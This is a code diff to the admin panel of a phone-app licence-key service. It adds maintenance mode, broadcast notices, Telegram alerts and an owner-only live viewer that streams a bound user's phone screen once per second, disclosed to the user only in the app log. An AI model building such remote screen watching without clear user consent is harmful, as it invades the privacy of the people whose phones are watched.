@@ -47,7 +47,10 @@ function openModal(html, onMount) {
   $("#modalRoot").classList.remove("hidden");
   if (onMount) onMount($("#modalBox"));
 }
-function closeModal() { $("#modalRoot").classList.add("hidden"); $("#modalBox").innerHTML = ""; }
+function closeModal() {
+  if (LIVE_TIMER) { clearInterval(LIVE_TIMER); LIVE_TIMER = null; }   // live screen poll dies with the drawer
+  $("#modalRoot").classList.add("hidden"); $("#modalBox").innerHTML = "";
+}
 $("#modalRoot").addEventListener("click", e => { if (e.target.dataset.close) closeModal(); });
 document.addEventListener("keydown", e => { if (e.key === "Escape") closeModal(); });
 
@@ -163,10 +166,55 @@ function showLogin() {
   $("#appView").classList.add("hidden");
   $("#loginView").classList.remove("hidden");
 }
+/* v2.3 - maintenance pill in the topbar + live screen poll state */
+let LIVE_TIMER = null, LIVE_CODE = "", LIVE_DEV = "";
+function paintMaintPill() {
+  let p = $("#maintPill");
+  const on = !!(ME && ME.maint);
+  if (!on) { if (p) p.remove(); return; }
+  if (!p) {
+    p = document.createElement("div");
+    p.id = "maintPill";
+    p.className = "maint-pill";
+    p.title = ME.maint_msg || "maintenance mode is on - new phone logins are refused";
+    p.innerHTML = `<span class="pulse-dot dot-red"></span>MAINTENANCE<b id="maintTxt"></b>`;
+    $(".top-right").insertBefore(p, $("#btnPalette"));
+  }
+  const t = $("#maintTxt");
+  if (t) t.textContent = ME.maint_msg || "";
+}
+
+/* v2.3 - live screen viewer (key detail drawer) */
+function liveTick() {
+  const img = $("#liveImg");
+  if (!img || !document.body.contains(img)) {          // drawer closed -> stop
+    if (LIVE_TIMER) { clearInterval(LIVE_TIMER); LIVE_TIMER = null; }
+    return;
+  }
+  img.src = "/api/admin/screen?k=" + encodeURIComponent(LIVE_CODE)
+          + "&d=" + encodeURIComponent(LIVE_DEV) + "&_=" + Date.now();
+}
+function liveStartPoll() {
+  if (LIVE_TIMER) clearInterval(LIVE_TIMER);
+  liveTick();
+  LIVE_TIMER = setInterval(liveTick, 1000);
+}
+function liveState(txt, cls) {
+  const st = $("#liveState");
+  if (st) { st.className = "badge " + cls; st.textContent = txt; }
+}
+function liveResetView() {
+  const img = $("#liveImg");
+  if (img) img.classList.add("hidden");
+  const w = $("#liveWait");
+  if (w) w.classList.remove("hidden");
+}
+
 async function showApp() {
   $("#loginView").classList.add("hidden");
   $("#appView").classList.remove("hidden");
   applyRole(ME.user.role);
+  paintMaintPill();
   $("#uName").textContent = ME.user.username;
   $("#uRole").textContent = ME.user.role === "owner" ? "♛ " + ME.user.role : ME.user.role;
   $("#uAvatar").textContent = ME.user.username[0].toUpperCase();
@@ -444,6 +492,7 @@ function renderWire(live) {
   let el = $("#wireStats");
   if (!el) return;
   el.innerHTML = `
+    <span title="phones seen in last 90 seconds">🟢 ${live.phones_online ?? 0} online now</span>
     <span title="phones seen in last 24h">📱 ${live.devices_24h ?? 0} devices/24h</span>
     <span title="keys used in last hour">🔥 ${live.phones_now ?? 0} active now</span>
     <span title="devices blocked by limit in last 24h">⛔ ${live.blocked_devices_24h ?? 0} blocked/24h</span>`;
@@ -451,6 +500,7 @@ function renderWire(live) {
 
 const EV_ICONS = { login: "🔑", "key.create": "✨", "key.revoke": "⛔", "key.reset": "🛠",
   "device.bind": "📱", "device.block": "⛔", "device.unbind": "🔌",
+  "device.watch": "👁", "sys.maint": "🚧", "sys.broadcast": "📢",
   "user.create": "👤", "user.delete": "🗑", "user.ban": "🚫", balance: "💰" };
 
 async function loadWire() {
@@ -927,8 +977,10 @@ async function openKeyDetail(id) {
   const r = await api(`/api/keys/${id}/detail`);
   if (r.error) return toast(r.error, "err");
   const k = r.key, devs = r.devices || [];
+  const code = k.key_code;
   const lim = k.device_limit || 0;
   const canManage = ME.user.role !== "reseller";
+  const isOwner = ME.user.role === "owner";   // live screen is owner only
   const expLine = k.expires_at >= PERM ? "PERMANENT"
     : fmtDate(k.expires_at) + (k.expires_at > Date.now() / 1000
       ? " • " + Math.ceil((k.expires_at - Date.now() / 1000) / 86400) + "d left"
@@ -949,26 +1001,131 @@ async function openKeyDetail(id) {
         ? `<span class="badge badge-gold">CUSTOM</span>` : `<span class="badge badge-gray">AUTO</span>`}</div>
       <div class="sys-row"><span class="sub">DEVICE LIMIT</span>
         <b style="color:var(--gold)">${devs.length} / ${lim === 0 ? "∞" : lim}</b></div>
+      <div class="sys-row"><span class="sub">TOTAL LOGINS</span>
+        <b style="color:var(--blue)">${k.logins ?? devs.reduce((a, d) => a + (d.uses || 0), 0)}</b></div>
       <div class="sys-row"><span class="sub">CREATED BY</span><b>${esc(k.by)}</b></div>
       <div class="sys-row" style="border:none"><span class="sub">LAST SEEN</span><b>${relTime(k.last_seen)}</b></div>
     </div>
     ${k.note ? `<div class="note">note: <b style="color:var(--text)">${esc(k.note)}</b></div>` : ""}
     <label style="margin-top:16px">BOUND DEVICES (${devs.length})</label>
     ${devs.length ? `
-    <table class="tbl"><thead><tr><th>DEVICE ID</th><th>FIRST SEEN</th><th>LAST SEEN</th>${canManage ? "<th></th>" : ""}</tr></thead>
-    <tbody>${devs.map(d => `
+    <table class="tbl"><thead><tr><th>DEVICE ID</th><th>FIRST SEEN</th><th>LAST SEEN</th><th>LOGINS</th><th>STATUS</th>${canManage ? (isOwner ? "<th>LIVE</th>" : "") + "<th></th>" : ""}</tr></thead>
+    <tbody>${devs.map(d => {
+      const onNow = d.last_seen > Date.now() / 1000 - 150;
+      return `
       <tr>
         <td class="mono" style="font-size:11px">${esc(d.device_id)}</td>
         <td class="mono">${relTime(d.first_seen)}</td>
         <td class="mono">${relTime(d.last_seen)}</td>
-        ${canManage ? `<td><button class="btn btn-sm btn-red" data-unbind="${esc(d.device_id)}">UNBIND</button></td>` : ""}
-      </tr>`).join("")}</tbody></table>`
+        <td class="mono" style="color:var(--gold);font-weight:700">${d.uses ?? 0}</td>
+        <td>${d.watch
+          ? `<span class="badge badge-gold">WATCHING</span>`
+          : onNow ? `<span class="badge badge-green">ON NOW</span>`
+                  : `<span class="badge badge-gray">OFFLINE</span>`}</td>
+        ${canManage ? `${isOwner ? `<td>${d.watch
+          ? `<button class="btn btn-sm btn-green" data-live="${esc(d.device_id)}">WATCHING</button>`
+          : `<button class="btn btn-sm btn-blue" data-live="${esc(d.device_id)}">LIVE</button>`}</td>` : ""}
+        <td><button class="btn btn-sm btn-red" data-unbind="${esc(d.device_id)}">UNBIND</button></td>` : ""}
+      </tr>`; }).join("")}</tbody></table>`
       : `<div class="note">koi phone abhi bind nahi hai — pehli phone jo activate karegi wo bind hogi.</div>`}
+    ${devs.length && isOwner ? `
+    <label style="margin-top:18px">LIVE SCREEN OF THIS PHONE</label>
+    <div class="live-box">
+      <div class="live-head">
+        <span class="sub" id="liveWho">kisi device ki row me LIVE dabao</span>
+        <span class="badge badge-gray" id="liveState">IDLE</span>
+      </div>
+      <div class="live-wait" id="liveWait">frame abhi nahi hai — phone ke LIVE hone ka wait karo
+        (phone agle 20s check me stream shuru karti hai)</div>
+      <img id="liveImg" class="hidden" alt="phone screen">
+      <div class="live-ctl">
+        <button class="btn btn-sm btn-green" id="liveOn">START WATCH</button>
+        <button class="btn btn-sm btn-red" id="liveOff">STOP WATCH</button>
+        <span class="fine" style="margin:0;text-align:left">phone par screen capture chalu hota hai —
+        user ko app log me dikhta hai.</span>
+      </div>
+    </div>` : ""}
     <div class="modal-actions">
       ${canManage ? `<button class="btn btn-green" id="kdReset">OPEN RESET</button>` : ""}
       <button class="btn btn-ghost" data-close="1">CLOSE</button>
     </div>`, box => {
     bindCopy(box);
+    /* live screen: img plumbing + watch buttons */
+    const img = $("#liveImg", box);
+    if (img) {
+      img.onload = () => {
+        img.classList.remove("hidden");
+        $("#liveWait", box)?.classList.add("hidden");
+        liveState("LIVE", "badge-green");
+      };
+      img.onerror = () => {
+        img.classList.add("hidden");
+        $("#liveWait", box)?.classList.remove("hidden");
+        liveState("WAITING FOR PHONE", "badge-gray");
+      };
+    }
+    const liveOn = $("#liveOn", box), liveOff = $("#liveOff", box);
+    if (liveOn) liveOn.onclick = async () => {
+      if (!LIVE_DEV) return toast("pehle device row me LIVE dabao", "err");
+      const rr = await api("/api/admin/watch", "POST",
+        { key: code, device: LIVE_DEV, on: 1 });
+      if (rr.error) return toast(rr.error, "err");
+      $$("[data-live]", box).forEach(b => {
+        if (b.dataset.live === LIVE_DEV) {
+          b.textContent = "WATCHING";
+          b.classList.remove("btn-blue"); b.classList.add("btn-green");
+        }
+      });
+      liveState("CONNECTING", "badge-blue");
+      liveStartPoll();
+      toast("watch ON - phone 20s ke andar frame bhejegi", "gold");
+    };
+    if (liveOff) liveOff.onclick = async () => {
+      if (!LIVE_DEV) return;
+      const rr = await api("/api/admin/watch", "POST",
+        { key: code, device: LIVE_DEV, on: 0 });
+      if (rr.error) return toast(rr.error, "err");
+      if (LIVE_TIMER) { clearInterval(LIVE_TIMER); LIVE_TIMER = null; }
+      liveResetView();
+      liveState("STOPPED", "badge-red");
+      $$("[data-live]", box).forEach(b => {
+        if (b.dataset.live === LIVE_DEV) {
+          b.textContent = "LIVE";
+          b.classList.remove("btn-green"); b.classList.add("btn-blue");
+        }
+      });
+      toast("watch OFF - phone stream band kar degi", "gold");
+    };
+    $$("[data-live]", box).forEach(b => b.onclick = async () => {
+      const dev = b.dataset.live;
+      const rr = await api("/api/admin/watch", "POST",
+        { key: code, device: dev, on: 1 });
+      if (rr.error) return toast(rr.error, "err");
+      b.textContent = "WATCHING";
+      b.classList.remove("btn-blue"); b.classList.add("btn-green");
+      LIVE_CODE = code; LIVE_DEV = dev;
+      const who = $("#liveWho", box);
+      if (who) who.textContent = dev.slice(0, 20) + (dev.length > 20 ? "…" : "");
+      liveState("CONNECTING", "badge-blue");
+      liveStartPoll();
+      toast("live watch ON - phone 20s me stream shuru karegi", "gold");
+    });
+    /* phone already watching -> join the stream the moment the drawer opens */
+    const watching = devs.find(d => d.watch);
+    if (watching && $("#liveState", box)) {
+      LIVE_CODE = code; LIVE_DEV = watching.device_id;
+      const who = $("#liveWho", box);
+      if (who) who.textContent = watching.device_id.slice(0, 20)
+        + (watching.device_id.length > 20 ? "…" : "");
+      $$("[data-live]", box).forEach(b => {
+        if (b.dataset.live === watching.device_id) {
+          b.textContent = "WATCHING";
+          b.classList.remove("btn-blue"); b.classList.add("btn-green");
+        }
+      });
+      liveState("CONNECTING", "badge-blue");
+      liveStartPoll();
+    }
     $$("[data-unbind]", box).forEach(b => b.onclick = async () => {
       const rr = await api(`/api/keys/${id}/device`, "POST", { device_id: b.dataset.unbind });
       if (rr.error) return toast(rr.error, "err");
@@ -1424,6 +1581,36 @@ PAGES.settings = () => {
         <b style="color:var(--gold)">HMAC receipt</b> and counts down locally — phones keep working offline,
         and every reconnect re-checks revocation &amp; device lock.</div>
       </div>
+      <div class="card">
+        <h3>MAINTENANCE SWITCH</h3>
+        <div class="sys-row"><span class="sub">STATE</span>
+          <span class="badge badge-gray" id="maintBadge">CHECKING</span></div>
+        <button class="btn btn-red" id="maintGo" style="width:100%;margin-top:14px" disabled>
+          LOAD STATE</button>
+        <label class="sub" style="letter-spacing:.2em;font-size:10px;margin-top:16px">MESSAGE PHONES SEE</label>
+        <input id="maintMsg" maxlength="200" placeholder="server maintenance - try again in 10 minutes">
+        <div class="note" style="margin-top:12px">ON = naye login band — phone pe
+        <b style="color:var(--red)">MAINTENANCE</b> dikhta hai. purane sessions aur ye panel
+        bilkul chalte rahenge.</div>
+      </div>
+      <div class="card">
+        <h3>APK NOTICE</h3>
+        <label class="sub" style="letter-spacing:.2em;font-size:10px">SHOWN IN THE APP LOG</label>
+        <input id="bcMsg" maxlength="200" placeholder="new version 11 PM - update kar lena">
+        <button class="btn btn-gold-sm" id="bcGo" style="margin-top:16px" disabled>PUSH NOTICE</button>
+        <div class="note" style="margin-top:12px">phone ise har sweep par padhta hai
+        (har <b style="color:var(--gold)">20 second</b>). khali karke save = notice hata do.</div>
+      </div>
+      <div class="card">
+        <h3>TELEGRAM ALERTS</h3>
+        <label class="sub" style="letter-spacing:.2em;font-size:10px">BOT TOKEN</label>
+        <input id="tgToken" maxlength="120" placeholder="123456:ABC-DEF..." autocomplete="off">
+        <label class="sub" style="letter-spacing:.2em;font-size:10px;margin-top:12px">CHAT ID</label>
+        <input id="tgChat" maxlength="120" placeholder="-100123456789" autocomplete="off">
+        <button class="btn btn-blue" id="tgGo" style="width:100%;margin-top:16px" disabled>SAVE ALERTS</button>
+        <div class="note" style="margin-top:12px">koi nayi phone key bind kare to turant message.
+        dono field khali = alerts band.</div>
+      </div>
     </div>`;
   $$("#accentRow .acc-sw").forEach(b => b.onclick = () => {
     applyAccent(b.dataset.acc);
@@ -1438,7 +1625,68 @@ PAGES.settings = () => {
     toast("password updated — other sessions closed");
     $("#pwOld").value = $("#pwNew").value = $("#pwNew2").value = "";
   };
+  loadSwitches();
 };
+
+/* v2.3 - maintenance / apk notice / telegram switches */
+async function loadSwitches() {
+  const can = ME.user.role !== "reseller";
+  ["maintGo", "bcGo", "tgGo"].forEach(id => {
+    const b = $("#" + id);
+    if (b) b.disabled = !can;
+  });
+  if (!can) {
+    const badge = $("#maintBadge");
+    if (badge) badge.textContent = "OWNER / ADMIN ONLY";
+    return;
+  }
+  const r = await api("/api/admin/settings");
+  if (r.error) return toast(r.error, "err");
+  $("#maintMsg").value = r.maint_msg || "";
+  $("#bcMsg").value = r.broadcast || "";
+  $("#tgToken").value = r.tg_token || "";
+  $("#tgChat").value = r.tg_chat || "";
+  ["maintGo", "bcGo", "tgGo"].forEach(id => { const b = $("#" + id); if (b) b.disabled = false; });
+  paintMaintCard(r);
+
+  $("#bcGo").onclick = async () => {
+    const rr = await api("/api/admin/settings", "POST",
+      { broadcast: $("#bcMsg").value.trim() });
+    if (rr.error) return toast(rr.error, "err");
+    toast($("#bcMsg").value.trim() ? "notice pushed - phone par agle check me dikhega"
+                                   : "notice cleared", "gold");
+  };
+  $("#tgGo").onclick = async () => {
+    const rr = await api("/api/admin/settings", "POST",
+      { tg_token: $("#tgToken").value.trim(), tg_chat: $("#tgChat").value.trim() });
+    if (rr.error) return toast(rr.error, "err");
+    toast("telegram alerts saved", "ok");
+  };
+}
+
+function paintMaintCard(s) {
+  const badge = $("#maintBadge"), btn = $("#maintGo");
+  if (!badge || !btn) return;
+  badge.className = "badge " + (s.maint ? "badge-red" : "badge-green");
+  badge.textContent = s.maint ? "ON - NEW LOGINS BLOCKED" : "OFF - ALL CLEAR";
+  btn.className = "btn " + (s.maint ? "btn-green" : "btn-red");
+  btn.textContent = s.maint ? "TURN MAINTENANCE OFF" : "TURN MAINTENANCE ON";
+  btn.onclick = async () => {
+    btn.disabled = true;
+    const msg = $("#maintMsg").value.trim();
+    const rr = await api("/api/admin/settings", "POST",
+      { maint: !s.maint, maint_msg: msg });
+    btn.disabled = false;
+    if (rr.error) return toast(rr.error, "err");
+    s.maint = !s.maint;
+    s.maint_msg = s.maint ? msg : "";
+    paintMaintCard(s);
+    if (ME) { ME.maint = s.maint; ME.maint_msg = s.maint ? msg : ""; }
+    paintMaintPill();
+    toast(s.maint ? "MAINTENANCE ON - phones ko ab naya login nahi milega"
+                  : "maintenance OFF - logins open", s.maint ? "err" : "ok");
+  };
+}
 
 /* ───── shared bindings ───── */
 function bindCopy(root) {
